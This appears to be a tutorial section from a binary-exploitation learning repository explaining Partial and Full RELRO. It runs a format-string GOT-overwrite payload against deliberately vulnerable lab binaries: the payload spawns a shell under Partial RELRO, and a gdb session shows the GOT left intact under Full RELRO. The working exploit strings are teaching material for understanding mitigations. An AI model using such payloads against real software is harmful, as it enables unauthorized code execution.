# Relocation Read-Only(RELRO)

This is the last security mechanism that makes some sections of the binary have read-only permissions. I disabled it with `-Wl,-z,norelro` in the attachment with GOT overwriting.

So, there are two types of RELRO: Partial RELRO and Full RELRO. First "forces the GOT to come before the BSS in memory, eliminating the risk of a buffer overflows on a global variable overwriting GOT entries". But second, makes the GOT read-only, so, attacks like GOT overwrite will be useless when this option occurs.

Let's dive in and see the difference in the 'got-overwrite' binary. I'll recompile it with enabled RELRO and will execute the exploit again. I didn't write python exploit on GOT overwrite and this was nice, because now when I compile it with Partial RELRO. Again, do the algorithm to exploit the format string and overwrite the GOT entries with system syscall. You can compare the exploit here and exploit there in the format-string section. Here, it changed.

```bash
$ checksec got-overwrite-with-partial-relro
[*] '/home/shogun/repos/basics-of-pwn/content/security-techniques/got-overwrite-with-partial-relro'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
$ ./got-overwrite-with-partial-relro $(python -c 'print "\x0c\xc0\x04\x08" + "\x0e\xc0\x04\x08" + "\x10\xc0\x04\x08" + "\x12\xc0\x04\x08" + "%6176u" + "%54$n" + "%57264u" + "%55$n" + "%55760u" + "%56$n" + "%9778u" + "%57$n"')

0/bin/sh
$ w
 22:10:25 up 28 min,  1 user,  load average: 0.50, 0.39, 0.36
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shogun   tty7     :0               21:42   28:09   1:11   1.19s xfce4-session
$
```

Okay, partial RELRO is useless against our attack. Let's consider Full RELRO.
```bash
$ gcc ../format-string/got-overwrite.c -o got-overwrite-with-full-relro -fno-stack-protector -no-pie -z execstack -m32 -Wl,-z,relro,-z,now
$ checksec got-overwrite-with-full-relro
[*] '/home/shogun/repos/basics-of-pwn/content/security-techniques/got-overwrite-with-full-relro'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
$ gdb -q got-overwrite-with-full-relro
gef➤  b *main + 138
Breakpoint 1 at 0x8049260
gef➤  r $(python -c 'print "\x0c\xc0\x04\x08" + "\x0e\xc0\x04\x08" + "\x10\xc0\x04\x08" + "\x12\xc0\x04\x08" + "%6176u" + "%54$n" + "%57264u" + "%55$n" + "%55760u" + "%56$n" + "%9778u" + "%57$n"')
0/bin/sh

Breakpoint 1, 0x08049260 in main ()
gef➤  got

GOT protection: Full RelRO | GOT functions: 4

[0x804bfec] printf@GLIBC_2.0  →  0xf7e10340
[0x804bff0] gets@GLIBC_2.0  →  0xf7e2d1b0
[0x804bff4] __libc_start_main@GLIBC_2.0  →  0xf7ddadf0
[0x804bff8] strncpy@GLIBC_2.0  →  0xf7e57690
gef➤  c
Continuing.
/bin/sh[Inferior 1 (process 6582) exited normally]
gef➤  quit
$ ./got-overwrite-with-full-relro $(python -c 'print "\x0c\xc0\x04\x08" + "\x0e\xc0\x04\x08" + "\x10\xc0\x04\x08" + "\x12\xc0\x04\x08" + "%6176u" + "%54$n" + "%57264u" + "%55$n" + "%55760u" + "%56$n" + "%9778u" + "%57$n"')

0/bin/sh
/bin/sh
$
```
Thus, the GOT entries stayed the same.
